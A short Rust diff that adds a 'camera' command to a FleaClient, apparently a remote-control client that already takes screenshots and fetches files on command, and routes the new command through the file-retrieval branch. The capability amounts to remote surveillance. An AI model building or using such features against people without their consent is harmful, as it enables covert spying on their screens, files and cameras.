@@ -7,6 +7,7 @@ use log::{debug, error};
 const MAX_INPUT_BUFFER: usize = 1024;
 const SPECIAL_COMMAND_GET_SCREENSHOT: &str = "screenshot";
 const SPECIAL_COMMAND_GET_FILE: &str = "getfile";
+const SPECIAL_COMMAND_GET_CAMERA_FRAME: &str = "camera";
 
 pub struct FleaClient
 {    
@@ -111,7 +112,7 @@ impl FleaClient
                             ret_value = false;
                         }                           
                     }
-                    else if cmd.eq(SPECIAL_COMMAND_GET_FILE)
+                    else if cmd.eq(SPECIAL_COMMAND_GET_FILE) || cmd.eq(SPECIAL_COMMAND_GET_CAMERA_FRAME)
                     {
                         if let Ok(bytes) = &self.digits_to_bytes(&read_string)
                         {
